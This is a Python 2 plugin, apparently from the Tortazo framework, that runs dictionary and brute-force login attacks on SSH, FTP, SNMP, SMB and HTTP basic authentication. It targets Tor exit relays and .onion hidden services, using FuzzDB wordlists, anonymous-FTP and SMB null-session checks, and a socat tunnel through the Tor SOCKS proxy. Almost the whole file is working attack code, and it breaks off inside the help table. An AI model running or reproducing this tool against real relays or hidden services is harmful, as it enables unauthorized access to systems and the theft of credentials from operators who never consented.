# coding=utf-8
'''
Created on 22/01/2014

#Author: Adastra.
#twitter: @jdaanial

bruterPlugin.py

bruterPlugin is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

bruterPlugin is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Tortazo; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
'''

from core.tortazo.pluginManagement.BasePlugin import BasePlugin
from plugins.texttable import Texttable
import socket
import os
import sys
import time
from socket import error as socket_error
import signal
import paramiko
from core.tortazo.exceptions.PluginException import PluginException
from plugins.utils.validations.Validator import *

class bruterPlugin(BasePlugin):
    '''
    Class to  implement a bruteforce plugin against TOR exit nodes and hidden services in the deep web.
    '''

    def __init__(self, torNodes=[]):
        BasePlugin.__init__(self, torNodes, 'bruterPlugin')
        self.setPluginDetails('bruter', "Bruteforce plugin for services in the deep web. TIP: If you run this plugin in SSH Brute force mode, don't activate the -v/..verbose. If you use that option, you'll see a lot of debug message traced by Paramiko library.", '1.0', 'Adastra: @jdaanial')
        if len(torNodes) > 0:
            self.info("[*] bruterPlugin Initialized!")
        self.bruteForceData = {}
        for torNode in self.torNodes:
            openPorts = []
            for port in torNode.openPorts:
                openPorts.append(port.port)
                if len(openPorts) > 0:
                    self.bruteForceData[torNode.host] = openPorts
        self.separator = ":"
        self.pluginConfigs= {}


    def processPluginArguments(self):
        BasePlugin.processPluginArguments(self)


    def __del__(self):
        if len(self.torNodes) > 0:
            self.info("[*] bruterPlugin Destroyed!")

    def setDictSeparator(self, separator):
        print "[+] Setting separator '%s' for dictionary files. Every line en the file must contain <user><separator><passwd>" %(separator)
        self.separator = separator

    ################################################################################################################################################
    ###########################FUNCTIONS TO PERFORM SSH BRUTEFORCE ATTACKS.#########################################################################
    ################################################################################################################################################
    def sshBruterOnRelay(self, relay, port=22, dictFile=None, force=False):
        if is_valid_ipv4_address(relay) == False and is_valid_ipv6_address(relay) == False and is_valid_domain(relay) == False:
            pluginException = PluginException(message='[-] The relay specified is invalid. %s ' %(relay), trace="sshBruterOnRelay with args relay=%s , port=%s , dictFile=%s , force=%s " %(relay, str(port), dictFile, str(force)), plugin="bruterPlugin", method="sshBruterOnRelay")
            if self.runFromInterpreter:
                showTrace(pluginException)
                return
            else:
                print '[-] The relay specified is invalid. %s ' %(relay)
                raise pluginException

        if is_valid_port(port) == False:
            pluginException = PluginException(message='[-] The port specified is invalid. %s ' %(str(port)), trace="sshBruterOnRelay with args relay=%s , port=%s , dictFile=%s , force=%s " %(relay, str(port), dictFile, str(force)), plugin="bruterPlugin", method="sshBruterOnRelay")
            if self.runFromInterpreter:
                showTrace(pluginException)
                return
            else:
                print "[-] The port specified is invalid. "
                raise pluginException

        if self.bruteForceData.has_key(relay) == False and force==False:
            print "[-] IP Address %s not found in the relays. If you want to run the scan against this host, use the parameter 'force=True' of this function" %(relay)
            return False
        
        if force == False and port not in self.bruteForceData[relay]:
            print "[-] Port %s in the selected relay is 'closed' in the information recorded in database. If you think that it's really open, use the parameter 'force=True' of this function" %(str(port))
            return False

        print "[+] Starting SSH BruteForce mode against %s on port %s" %(relay, str(port))

        if dictFile is None:
            print "[+] No specified 'dictFile'. Using FuzzDB Project to execute the attack."
            usersList = self.fuzzDBReader.getUserlistFromFuzzDB()
            passList = self.fuzzDBReader.getPasslistFromFuzzDB()
            stop_attack = False
            for user in usersList:
                if stop_attack:
                    break
                for passwd in passList:
                    try:
                        if self.serviceConnector.performSSHConnection(relay, port, user, passwd):
                            print "[+] SSH BruteForce attack successfully. User %s - Passwd %s " %(user, passwd)
                            stop_attack = True
                            break
                    except:
                        pluginException = PluginException(message="Error detected. Are you sure that the service is up and running?",
                                  trace="sshBruterOnRelay with args relay=%s , port=%s , dictFile=%s " %(relay, str(port), dictFile),
                                  plugin="bruterPlugin", method="sshBruterOnRelay")
                        if self.runFromInterpreter:
                            showTrace(pluginException)
                            return
                        else:
                            print '[-] Error detected. Are you sure that the service is up and running?'
                            raise pluginException
        else:
            print "[+] Using the 'dictFile' stored in %s. Verifing the file. " %(dictFile)
            if os.path.exists(dictFile) == False or os.path.isfile(dictFile) == False:
                print "[-] The file selected doesn't exists or is a directory."
                return False
            for line in open(dictFile, "r").readlines():
                [user, passwd] = line.strip().split(self.separator)
                try:
                    if self.serviceConnector.performSSHConnection(relay, port, user, passwd):
                        print "[+] SSH BruteForce attack successfully. User %s - Passwd %s " %(user, passwd)
                        break
                except:
                    pluginException = PluginException(message="Error detected. Are you sure that the service is up and running?",
                                  trace="sshBruterOnRelay with args relay=%s , port=%s , dictFile=%s " %(relay, str(port), dictFile),
                                  plugin="bruterPlugin", method="sshBruterOnRelay")
                    if self.runFromInterpreter:
                        showTrace(pluginException)
                        return
                    else:
                        print '[-] Error detected. Are you sure that the service is up and running?'
                        raise pluginException

            
    def sshBruterOnAllRelays(self, port=22, dictFile=None, force=False):
        if is_valid_port(port) == False:
            pluginException = PluginException(message='[-] The port specified is invalid. %s ' %(str(port)),
                                              trace="sshBruterOnAllRelays with args port=%s , dictFile=%s , force=%s " %(str(port), dictFile, str(force)),
                                              plugin="bruterPlugin", method="sshBruterOnAllRelays")
            if self.runFromInterpreter:
                showTrace(pluginException)
                return
            else:
                print "[-] The port specified is invalid. "
                raise pluginException

        for relay in self.bruteForceData:
            self.sshBruterOnRelay(relay=relay, port=port, dictFile=dictFile, force=force)

    def sshBruterOnHiddenService(self, onionService, port=22, dictFile=None):
        if is_valid_onion_address(onionService) == False:
            pluginException = PluginException(message="Invalid Onion Address %s must contain 16 characters. The TLD must be .onion" %(onionService),
                                  trace="sshBruterOnHiddenService with args onionService=%s, port=%s, dictFile=%s " %(onionService, str(port), dictFile),
                                  plugin="bruterPlugin",
                                  method="sshBruterOnHiddenService")
            if self.runFromInterpreter:
                showTrace(pluginException)
                return
            else:
                print "[-] Invalid Onion Address %s must contain 16 characters. The TLD must be .onion" %(onionService)
                raise pluginException
            
        if is_valid_port(port) == False:
            pluginException = PluginException(message="The port specified is invalid.",
                                  trace="sshBruterOnHiddenService with args onionService=%s, port=%s, dictFile=%s " %(onionService, str(port), dictFile),
                                  plugin="bruterPlugin",
                                  method="sshBruterOnHiddenService")
            if self.runFromInterpreter:
                showTrace(pluginException)
                return
            else:
                print "[-] The port specified is invalid. "
                raise pluginException


        print "[+] Starting SSH BruteForce mode against %s on port %s" %(onionService, str(port))
        if dictFile is None:
            print "[+] No specified 'dictFile'. Using FuzzDB Project to execute the attack."
            usersList = self.fuzzDBReader.getUserlistFromFuzzDB()
            passList = self.fuzzDBReader.getPasslistFromFuzzDB()
            stop_attack = False
            for user in usersList:
                if stop_attack:
                    break
                for password in passList:
                    try:
                        if self.serviceConnector.performSSHConnectionHiddenService(onionService, port, user, password):
                            print "[+] SSH BruteForce attack successfully. User %s - Passwd %s " %(user, password)
                            stop_attack = True
                            break
                    except paramiko.SSHException as sshex:
                        pluginException = PluginException(message="\n\nSSH Exception found. Are you sure that the hidden service and the TOR Socks Proxy is up and running?",
                                  trace="sshBruterOnHiddenService with args onionService=%s, port=%s, dictFile=%s " %(onionService, str(port), dictFile),
                                  plugin="bruterPlugin",
                                  method="sshBruterOnHiddenService")
                        if self.runFromInterpreter:
                            showTrace(pluginException)
                            return
                        else:
                            print "[-] SSH Exception found. Are you sure that the hidden service and the TOR Socks Proxy is up and running?. "
                            raise pluginException

                    except paramiko.ProxyCommandFailure as proxyExc:
                        print "[-] Proxy Failure. Aborting the attack"
                        pluginException = PluginException(message="\n\nProxy Failure. Aborting the attack",
                                  trace="sshBruterOnHiddenService with args onionService=%s, port=%s, dictFile=%s " %(onionService, str(port), dictFile),
                                  plugin="bruterPlugin",
                                  method="sshBruterOnHiddenService")
                        if self.runFromInterpreter:
                            showTrace(pluginException)
                            return
                        else:
                            print "[-] Proxy Failure. Aborting the attack. "
                            raise pluginException
                    except socket_error as serr:
                        pluginException = PluginException(message="\n\nSSH Exception found. Are you sure that the hidden service and the TOR Socks Proxy is up and running?",
                                  trace="sshBruterOnHiddenService with args onionService=%s, port=%s, dictFile=%s " %(onionService, str(port), dictFile),
                                  plugin="bruterPlugin",
                                  method="sshBruterOnHiddenService")
                        if self.runFromInterpreter:
                            showTrace(pluginException)
                            return
                        else:
                            print "[-] SSH Exception found. Are you sure that the hidden service and the TOR Socks Proxy is up and running?. "
                            raise pluginException
        else:
            print "[+] Using the 'dictFile' stored in %s. Verifing the file. " %(dictFile)
            if os.path.exists(dictFile) == False or os.path.isfile(dictFile) == False:
                print "[-] The dictFile selected doesn't exists or is a directory."
                return False
            else:
                print "Executing the dictionary attack. Be patient."
            for line in open(dictFile, "r").readlines():
                [user, password] = line.strip().split(self.separator)
                try:
                    if self.serviceConnector.performSSHConnectionHiddenService(onionService, port, user, password):
                        print "[+] SSH BruteForce attack successfully. User %s - Passwd %s " %(user, password)
                        return True
                except socket_error as serr:
                    print "Connection Refused... Finishing the attack."
                    return False
                except paramiko.SSHException as sshExc:
                    pluginException = PluginException(message="\n\nSSH Exception found. Are you sure that the hidden service and the TOR Socks Proxy is up and running?",
                                  trace="sshBruterOnHiddenService with args onionService=%s, port=%s, dictFile=%s " %(onionService, str(port), dictFile),
                                  plugin="bruterPlugin",
                                  method="sshBruterOnHiddenService")
                    if self.runFromInterpreter:
                        showTrace(pluginException)
                        return
                    else:
                        print "[-] The port specified is invalid. "
                        raise pluginException



        return True



    ################################################################################################################################################
    ###########################FUNCTIONS TO PERFORM FTP BRUTEFORCE ATTACKS.#########################################################################
    ################################################################################################################################################
    def ftpBruterOnRelay(self, host, port=21, dictFile=None, proxy=False):
        '''
        This function is invoked by ftpBruterOnAllRelays and ftpBruterOnHiddenService.
        For this reason there's no checks to see if the host is stored in database. The user could enter the address for an onion service and this is perfectly valid.
        '''
        if proxy == False and is_valid_ipv4_address(host) == False and is_valid_ipv6_address(host) == False and is_valid_domain(host) == False:
            pluginException = PluginException(message='The host specified is invalid. %s ' %(host),
                                  trace="ftpBruterOnRelay with args host=%s , port=%s , dictFile=%s , proxy=%s " %(host, str(port), dictFile, str(proxy)),
                                  plugin="bruterPlugin", method="ftpBruterOnRelay")
            if self.runFromInterpreter:
                showTrace(pluginException)
                return
            else:
                print '[-] The host specified is invalid. %s ' %(host)
                raise pluginException

        if is_valid_port(port) == False:
            pluginException = PluginException(message='The port specified is invalid. %s ' %(str(port)),
                                  trace="ftpBruterOnRelay with args host=%s , port=%s , dictFile=%s , proxy=%s " %(host, str(port), dictFile, str(proxy)),
                                  plugin="bruterPlugin", method="ftpBruterOnRelay")
            if self.runFromInterpreter:
                showTrace(pluginException)
                return
            else:
                print "[-] The port specified is invalid. "
                raise pluginException
        
        if proxy:
            self.serviceConnector.setSocksProxy()
        else:
            self.serviceConnector.unsetSocksProxy()
        
        print "[+] Starting FTP BruteForce mode against %s on port %s" %(host, str(port))
        print "[+] Trying Anonymous access in: %s " %(host)
        if self.serviceConnector.anonymousFTPAccess(host,port):
            print "[+] FTP Anonymous access allowed in % " %(host)
            return False

        if dictFile is not None and os.path.exists(dictFile):
            print "[+] Reading the Passwords file %s " %(dictFile)
            for line in open(dictFile, "r").readlines():
                if len(line.strip().split(self.separator)) != 2:
                    continue
                [user, passwd] = line.strip().split(self.separator)

                try :
                    if self.serviceConnector.performFTPConnection(host,port, user=user, passwd=passwd):
                        print "[+] FTP BruteForce attack successfully. User %s - Passwd %s " %(user, passwd)
                        return True
                except Exception as excep:
                    pluginException = PluginException(message="Socket error detected. Are you sure that the hidden service and the TOR Socks Proxy is up and running?",
                                  trace="ftpBruterOnRelay with args host=%s , port=%s , dictFile=%s " %(host, str(port), dictFile),
                                  plugin="bruterPlugin", method="ftpBruterOnRelay")
                    if self.runFromInterpreter:
                        showTrace(pluginException)
                        return
                    else:
                        print '[-] Socket error detected. Are you sure that the hidden service and the TOR Socks Proxy is up and running?. %s ' %(host)
                        raise pluginException
        else:
            print "[+] No specified 'dictFile'. Using FuzzDB Project to execute the attack."
            usersList = self.fuzzDBReader.getUserlistFromFuzzDB()
            passList = self.fuzzDBReader.getPasslistFromFuzzDB()

            try :
                for user in usersList:
                    #Same user and password are valid?
                    if self.serviceConnector.performFTPConnection(host,port, user=user, passwd=user):
                        break
                    for passwd in passList:
                        if self.serviceConnector.performFTPConnection(host,port, user=user, passwd=passwd):
                            print "[+] FTP BruteForce attack successfully. User %s - Passwd %s " %(user, passwd)
                            return True
            except Exception as excep:
                pluginException = PluginException(message="Socket error detected. Are you sure that the hidden service and the TOR Socks Proxy is up and running?",
                                  trace="ftpBruterOnRelay with args host=%s , port=%s , dictFile=%s " %(host, str(port), dictFile),
                                  plugin="bruterPlugin", method="ftpBruterOnRelay")
                if self.runFromInterpreter:
                    showTrace(pluginException)
                    return
                else:
                    print '[-] Socket error detected. Are you sure that the hidden service and the TOR Socks Proxy is up and running?. %s ' %(host)
                    raise pluginException
        return True


    def ftpBruterOnAllRelays(self, port=21, dictFile=None):
        if is_valid_port(port) == False:
            pluginException = PluginException(message='[-] The port specified is invalid. %s ' %(str(port)),
                                  trace="ftpBruterOnAllRelays with args port=%s , dictFile=%s " %(str(port), dictFile),
                                  plugin="bruterPlugin", method="ftpBruterOnAllRelays")
            if self.runFromInterpreter:
                showTrace(pluginException)
                return
            else:
                print "[-] The port specified is invalid. "
                raise pluginException

        for relay in self.bruteForceData:
            self.ftpBruterOnRelay(relay, port=port, dictFile=dictFile)
        

    def ftpBruterOnHiddenService(self, onionService, port=21, dictFile=None):
        if is_valid_onion_address(onionService) == False:
            pluginException = PluginException(message="Invalid Onion Address %s must contain 16 characters. The TLD must be .onion" %(onionService),
                                  trace="ftpBruterOnHiddenService with args onionService=%s, port=%s, dictFile=%s " %(onionService, str(port), dictFile),
                                  plugin="bruterPlugin",
                                  method="ftpBruterOnHiddenService")
            if self.runFromInterpreter:
                showTrace(pluginException)
                return
            else:
                print "[-] Invalid Onion Address %s must contain 16 characters. The TLD must be .onion" %(onionService)
                raise pluginException
            
        if is_valid_port(port) == False:
            pluginException = PluginException(message="The port specified is invalid",
                                  trace="ftpBruterOnHiddenService with args onionService=%s, port=%s, dictFile=%s " %(onionService, str(port), dictFile),
                                  plugin="bruterPlugin",
                                  method="ftpBruterOnHiddenService")
            if self.runFromInterpreter:
                showTrace(pluginException)
                return
            else:
                print "[-] The port specified is invalid. "
                raise pluginException
        self.ftpBruterOnRelay(onionService,port=port, dictFile=dictFile, proxy=True)


    ################################################################################################################################################
    ###########################FUNCTIONS TO PERFORM SNMP BRUTEFORCE ATTACKS.########################################################################
    ################################################################################################################################################
    def snmpBruterOnRelay(self, host, port=161, dictFile=None):
        '''
        TOR only works on TCP, and typically SNMP works on UDP, so teorically you can not configure an SNMP Service as Hidden Service.
        '''
        if is_valid_ipv4_address(host) == False and is_valid_ipv6_address(host) == False and is_valid_domain(host) == False:
            pluginException = PluginException(message='The host specified is invalid. %s ' %(host),
                                  trace="snmpBruterOnRelay with args host=%s , port=%s , dictFile=%s " %(host, str(port), dictFile),
                                  plugin="bruterPlugin", method="snmpBruterOnRelay")
            if self.runFromInterpreter:
                showTrace(pluginException)
                return
            else:
                print '[-] The host specified is invalid. %s ' %(host)
                raise pluginException

        if is_valid_port(port) == False:
            pluginException = PluginException(message='The port specified is invalid. %s ' %(str(port)),
                                  trace="snmpBruterOnRelay with args host=%s , port=%s , dictFile=%s " %(host, str(port), dictFile),
                                  plugin="bruterPlugin", method="snmpBruterOnRelay")
            if self.runFromInterpreter:
                showTrace(pluginException)
                return
            else:
                print "[-] The port specified is invalid. %s " %(str(port))
                raise pluginException
        
        self.serviceConnector.unsetSocksProxy()
        print "[+] Starting SNMP BruteForce mode against %s on port %s" %(host, str(port))
        if dictFile is not None and os.path.exists(dictFile):
            print "[+] Reading the Passwords file %s " %(dictFile)
            from pysnmp.error import PySnmpError
            for community in open(dictFile, "r").readlines():
                try :
                    if self.serviceConnector.performSNMPConnection(host,port, community=community.replace(" ", "").replace("\n", "")):
                        print "[+] SNMP BruteForce attack successfully. Community %s " %(community)
                        break
                except PySnmpError as excep:
                    pluginException = PluginException(message="\n\nSNMP Exception found. Are you sure that the service is up and running? Error:  %s" %(str(excep)),
                                                      trace="snmpBruterOnRelay with args host=%s, port=%s, dictFile=%s " %(host, str(port), dictFile),
                                                      plugin="bruterPlugin",
                                                      method="snmpBruterOnRelay")
                    if self.runFromInterpreter:
                        showTrace(pluginException)
                        return
                    else:
                        print "[-] SNMP Exception found. Are you sure that the hidden service and the TOR Socks Proxy is up and running?. "
                        raise pluginException
        else:
            print "[+] No specified 'dictFile'. Using FuzzDB Project to execute the attack."
            communities = self.fuzzDBReader.getSNMPCommunitiesFromFuzzDB()
            try :
                for community in communities:
                    if self.serviceConnector.performSNMPConnection(host,port, community=community):
                        print "[+] SNMP BruteForce attack successfully. Community %s " %(community)
                        break
            except Exception as excep:
                pluginException = PluginException(message="\n\nSNMP Exception found. Are you sure that the service and the TOR Socks Proxy is up and running?",
                                                      trace="snmpBruterOnRelay with args host=%s, port=%s, dictFile=%s " %(host, str(port), dictFile),
                                                      plugin="bruterPlugin",
                                                      method="snmpBruterOnRelay")
                if self.runFromInterpreter:
                    showTrace(pluginException)
                    return
                else:
                    print "[-] SNMP Exception found. Are you sure that the hidden service and the TOR Socks Proxy is up and running?. "
                    raise pluginException

    def snmpBruterOnAllRelays(self, port=161, dictFile=None):
        if is_valid_port(port) == False:
            pluginException = PluginException(message='The port specified is invalid. %s ' %(str(port)),
                                  trace="snmpBruterOnAllRelays with args port=%s , dictFile=%s " %(str(port), dictFile),
                                  plugin="bruterPlugin", method="snmpBruterOnAllRelays")
            if self.runFromInterpreter:
                showTrace(pluginException)
                return
            else:
                print "[-] The port specified is invalid. %s " %(str(port))
                raise pluginException
                                                             
        for relay in self.bruteForceData:
            self.snmpBruterOnRelay(relay, port=port, dictFile=dictFile)

    ################################################################################################################################################
    ###########################FUNCTIONS TO PERFORM SMB BRUTEFORCE ATTACKS.#########################################################################
    ################################################################################################################################################
    def smbBruterOnRelay(self, host, port=139, dictFile=None):
        if is_valid_ipv4_address(host) == False and is_valid_ipv6_address(host) == False and is_valid_domain(host) == False:
            pluginException = PluginException(message='The host specified is invalid. %s ' %(host),
                                  trace="smbBruterOnRelay with args host=%s , port=%s , dictFile=%s " %(host, str(port), dictFile),
                                  plugin="bruterPlugin", method="smbBruterOnRelay")
            if self.runFromInterpreter:
                showTrace(pluginException)
                return
            else:
                print '[-] The host specified is invalid. %s ' %(host)
                raise pluginException

        if is_valid_port(port) == False:
            pluginException = PluginException(message='The port specified is invalid. %s ' %(str(port)),
                                  trace="snmpBruterOnRelay with args host=%s , port=%s , dictFile=%s " %(host, str(port), dictFile),
                                  plugin="bruterPlugin", method="smbBruterOnRelay")
            if self.runFromInterpreter:
                showTrace(pluginException)
                return
            else:
                print "[-] The port specified is invalid. %s " %(str(port))
                raise pluginException
                                                             
        print "[+] Starting SMB BruteForce mode against %s on port %s" %(host, str(port))
        print "[+] Testing a Null-Session against the target."
        from smb.base import NotConnectedError
        try:
            if self.serviceConnector.performSMBConnection(host, port,'',''):
                print "[+] SMB Null-Session found in host: %s " %(host)
                return True
        except socket_error:
            os.killpg(self.socatProcess.pid, signal.SIGTERM)
            pluginException = PluginException(message="Socket error detected. Are you sure that the hidden service and the TOR Socks Proxy is up and running?",
                                  trace="smbBruterOnRelay with args host=%s , port=%s , dictFile=%s " %(host, str(port), dictFile),
                                  plugin="bruterPlugin", method="smbBruterOnRelay")
            if self.runFromInterpreter:
                showTrace(pluginException)
                return
            else:
                print '[-] The host specified is invalid. %s ' %(host)
                raise pluginException
        except NotConnectedError:
            os.killpg(self.socatProcess.pid, signal.SIGTERM)
            time.sleep(5)
            pluginException = PluginException(message="NotConnectedError detected. Are you sure that the hidden service and the TOR Socks Proxy is up and running?",
                                  trace="smbBruterOnRelay with args host=%s , port=%s , dictFile=%s " %(host, str(port), dictFile),
                                  plugin="bruterPlugin", method="smbBruterOnRelay")
            if self.runFromInterpreter:
                showTrace(pluginException)
                return
            else:
                print '[-] NotConnectedError detected. Are you sure that the hidden service and the TOR Socks Proxy is up and running?. '
                raise pluginException



        if dictFile is not None and os.path.exists(dictFile):
            print "[+] Reading the Passwords file %s " %(dictFile)
            for line in open(dictFile, "r").readlines():
                [user, passwd] = line.strip().split(self.separator)
                try :
                    if self.serviceConnector.performSMBConnection(host,port, user=user, passwd=passwd):
                        print "[+] SMB BruteForce attack successfully. User %s - Passwd %s " %(user, passwd)
                        break
                except socket_error as excep:
                    os.killpg(self.socatProcess.pid, signal.SIGTERM)
                    pluginException = PluginException(message="Socket error detected. Are you sure that the hidden service and the TOR Socks Proxy is up and running?",
                                  trace="smbBruterOnRelay with args host=%s , port=%s , dictFile=%s " %(host, str(port), dictFile),
                                  plugin="bruterPlugin", method="smbBruterOnRelay")
                    if self.runFromInterpreter:
                        showTrace(pluginException)
                        return
                    else:
                        print '[-] Socket error detected. Are you sure that the hidden service and the TOR Socks Proxy is up and running? '
                        raise pluginException
                except NotConnectedError:
                    os.killpg(self.socatProcess.pid, signal.SIGTERM)
                    time.sleep(5)
                    pluginException = PluginException(message="NotConnectedError detected. Are you sure that the hidden service and the TOR Socks Proxy is up and running?",
                                  trace="smbBruterOnRelay with args host=%s , port=%s , dictFile=%s " %(host, str(port), dictFile),
                                  plugin="bruterPlugin", method="smbBruterOnRelay")
                    if self.runFromInterpreter:
                        showTrace(pluginException)
                        return
                    else:
                        print '[-] NotConnectedError detected. Are you sure that the hidden service and the TOR Socks Proxy is up and running?. '
                        raise pluginException

        else:
            print "[+] No specified 'dictFile'. Using FuzzDB Project to execute the attack."
            usersList = self.fuzzDBReader.getUserlistFromFuzzDB()
            passList = self.fuzzDBReader.getPasslistFromFuzzDB()

            try :
                for user in usersList:
                    #Same user and password are valid?
                    if self.serviceConnector.performSMBConnection(host,port, user=user, passwd=user):
                        print "[+] SMB BruteForce attack successfully. User %s - Passwd %s " %(user, passwd)
                        break
                    for passwd in passList:
                        if self.serviceConnector.performSMBConnection(host,port, user=user, passwd=passwd):
                            print "[+] SMB BruteForce attack successfully. User %s - Passwd %s " %(user, passwd)
                            return
            except socket_error as excep:
                os.killpg(self.socatProcess.pid, signal.SIGTERM)
                pluginException = PluginException(message="Socket error detected. Are you sure that the hidden service and the TOR Socks Proxy is up and running?",
                                  trace="smbBruterOnRelay with args host=%s , port=%s , dictFile=%s " %(host, str(port), dictFile),
                                  plugin="bruterPlugin", method="smbBruterOnRelay")
                if self.runFromInterpreter:
                    showTrace(pluginException)
                    return
                else:
                    print '[-] Socket error detected. Are you sure that the hidden service and the TOR Socks Proxy is up and running? '
                    raise pluginException
            except NotConnectedError:
                os.killpg(self.socatProcess.pid, signal.SIGTERM)
                time.sleep(5)
                pluginException = PluginException(message="NotConnectedError detected. Are you sure that the hidden service and the TOR Socks Proxy is up and running?",
                                  trace="smbBruterOnRelay with args host=%s , port=%s , dictFile=%s " %(host, str(port), dictFile),
                                  plugin="bruterPlugin", method="smbBruterOnRelay")
                if self.runFromInterpreter:
                    showTrace(pluginException)
                    return
                else:
                    print '[-] NotConnectedError detected. Are you sure that the hidden service and the TOR Socks Proxy is up and running?. '
                    raise pluginException

            

    def smbBruterOnAllRelays(self, port=139, dictFile=None):
        if is_valid_port(port) == False:
            pluginException = PluginException(message='The port specified is invalid. %s ' %(str(port)),
                                  trace="smbBruterOnAllRelays with args port=%s , dictFile=%s " %(str(port), dictFile),
                                  plugin="bruterPlugin", method="smbBruterOnAllRelays")
            if self.runFromInterpreter:
                showTrace(pluginException)
                return
            else:
                print "[-] The port specified is invalid. %s " %(str(port))
                raise pluginException
                                                             
                                                             
        for relay in self.bruteForceData:
            self.smbBruterOnRelay(relay, port=port, dictFile=dictFile)


    def smbBruterOnHiddenService(self, onionService, servicePort=139, localPort=139, dictFile=None):
        if is_valid_onion_address(onionService) == False:
            pluginException = PluginException(message="Invalid Onion Address %s must contain 16 characters. The TLD must be .onion" %(onionService),
                                  trace="smbBruterOnHiddenService with args onionService=%s, servicePort=%s, localPort=%s, dictFile=%s " %(onionService, str(servicePort), str(localPort), dictFile),
                                  plugin="bruterPlugin",
                                  method="smbBruterOnHiddenService")
            if self.runFromInterpreter:
                showTrace(pluginException)
                return
            else:
                print "[-] Invalid Onion Address %s must contain 16 characters. The TLD must be .onion" %(onionService)
                raise pluginException           

        if is_valid_port(servicePort) == False:
            pluginException = PluginException(message='The service port specified is invalid. %s ' %(str(servicePort)),
                                  trace="smbBruterOnHiddenService with args host=%s , servicePort=%s , localPort=%s , dictFile=%s " %(onionService, str(servicePort), str(localPort) , dictFile),
                                  plugin="bruterPlugin", method="smbBruterOnHiddenService")
            if self.runFromInterpreter:
                showTrace(pluginException)
                return
            else:
                print "[-] The service port specified is invalid. %s " %(str(servicePort))
                raise pluginException


        if is_valid_port(localPort) == False:
            pluginException = PluginException(message='The local port specified is invalid. %s ' %(str(localPort)),
                                  trace="smbBruterOnHiddenService with args host=%s , servicePort=%s , localPort=%s , dictFile=%s " %(onionService, str(servicePort), str(localPort) , dictFile),
                                  plugin="bruterPlugin", method="smbBruterOnHiddenService")
            if self.runFromInterpreter:
                showTrace(pluginException)
                return
            else:
                print "[-] The local port specified is invalid. %s " %(str(localPort))
                raise pluginException
                                                                     
        smbSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        smbSocket.settimeout(1)
        result = smbSocket.connect_ex(('127.0.0.1',localPort))
        if result == 0:
            print "[-] The selected local port "+str(localPort)+" is being used by another process. Please, select an port available in this machine"
            return False
        else:
            print "[+] Starting a local proxy with Socat to forward requests to the hidden service through the local machine and the local Socks Proxy... "
            self.socatProcess = self.serviceConnector.startLocalSocatTunnel(localPort,onionService,servicePort,socksPort=self.serviceConnector.socksPort)
            time.sleep(10)
            print "[+] Socat process started! PID: "+str(self.socatProcess.pid)
            self.smbBruterOnRelay('127.0.0.1', port=localPort, dictFile=dictFile)
            print "[+] SMB Bruter finished. Shutting down the local Socat tunnel..."
            os.killpg(self.socatProcess.pid, signal.SIGTERM)


    ################################################################################################################################################
    ###########################FUNCTIONS TO PERFORM HTTP BRUTEFORCE ATTACKS.########################################################################
    ################################################################################################################################################
    def httpBruterOnSite(self, url, dictFile=None, proxy=False):
        if proxy:
            self.serviceConnector.setSocksProxy()
        else:
            self.serviceConnector.unsetSocksProxy()

        if proxy == False:
            if is_valid_url(url) == False:
                pluginException = PluginException(message="The URL specified is invalid. %s " %(url),
                                                  trace="httpBruterOnSite with args url=%s, dictFile=%s, proxy=%s " %(url, dictFile, str(proxy)),
                                                  plugin="bruterPlugin", method="httpBruterOnSite")
                if self.runFromInterpreter:
                    showTrace(pluginException)
                    return
                else:
                    print "[-] The URL specified is invalid. %s " %(url)
                    raise pluginException

                                                                   
        print "[+] Starting HTTP BruteForce mode against %s " %(url)
        if dictFile is not None and os.path.exists(dictFile):
            print "[+] Reading the Passwords file %s " %(dictFile)
            for line in open(dictFile, "r").readlines():
                [user, passwd] = line.strip().split(self.separator)
                try :
                    print "[+] Trying with username=%s and password=%s" %(user, passwd)
                    if self.serviceConnector.performHTTPAuthConnection(url, user=user, passwd=passwd):
                        print "[+] HTTP BruteForce attack successfully. User %s - Passwd %s " %(user, passwd)
                        break
                except Exception as excep:
                    pluginException = PluginException(message="Exception detected. Are you sure that the hidden service and the TOR Socks Proxy is up and running?",
                                                      trace="httpBruterOnSite with args url=%s  " %(url),
                                                      plugin="bruterPlugin", method="httpBruterOnSite")
                    if self.runFromInterpreter:
                        showTrace(pluginException)
                        return
                    else:
                        print '[-] Exception detected. Are you sure that the hidden service and the TOR Socks Proxy is up and running?. '
                        raise pluginException
        else:
            print "[+] No specified 'dictFile'. Using FuzzDB Project to execute the attack."
            usersList = self.fuzzDBReader.getUserlistFromFuzzDB()
            passList = self.fuzzDBReader.getPasslistFromFuzzDB()

            try :
                for user in usersList:
                    #Same user and password are valid?
                    if self.serviceConnector.performHTTPAuthConnection(url, user=user, passwd=user):
                        print "[+] HTTP BruteForce attack successfully. User %s - Passwd %s " %(user, user)
                        break
                    for passwd in passList:
                        print "[+] Trying with username=%s and password=%s" %(user, passwd)
                        if self.serviceConnector.performHTTPAuthConnection(url, user=user, passwd=passwd):
                            print "[+] HTTP BruteForce attack successfully. User %s - Passwd %s " %(user, passwd)
                            return
            except Exception as excep:
                print "[-] Captured exception. Finishing attack."
                print sys.exc_info()
                return


    def httpBruterOnHiddenService(self, onionService, dictFile=None):
        if is_valid_onion_address(onionService) == False:
            pluginException = PluginException(message="Invalid Onion Address %s must contain 16 characters. The TLD must be .onion" %(onionService),
                                  trace="httpBruterOnHiddenService with args onionService=%s, dictFile=%s " %(onionService, dictFile),
                                  plugin="bruterPlugin",
                                  method="httpBruterOnHiddenService")
            if self.runFromInterpreter:
                showTrace(pluginException)
                return
            else:
                print "[-] Invalid Onion Address %s must contain 16 characters. The TLD must be .onion" %(onionService)
                raise pluginException 
                                                                   
        if onionService.startswith('http://') == False:
            self.httpBruterOnSite('http://'+onionService,dictFile=dictFile, proxy=True)
        else:
            self.httpBruterOnSite(onionService,dictFile=dictFile, proxy=True)


    def help(self):
        print "[*] Functions availaible available in the Plugin...\n"
        table = Texttable()
        table.set_cols_align(["l", "l", "c"])
        table.set_cols_valign(["m", "m", "m"])
        table.set_cols_width([25,20,20])
        table.add_rows([ ["Function", "Description", "Example"],
                         ['help', 'Help Banner', 'self.help()'],
